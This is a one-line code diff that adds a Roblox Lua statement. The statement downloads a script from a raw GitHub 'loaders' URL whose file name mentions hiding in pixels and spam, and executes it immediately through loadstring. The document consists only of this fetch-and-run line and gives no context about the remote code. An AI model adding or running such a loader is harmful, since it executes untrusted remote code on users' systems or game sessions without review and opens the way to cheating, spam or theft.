@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/hide-in-pixels-spam4-wok61thdjc6lf5.lua"))()
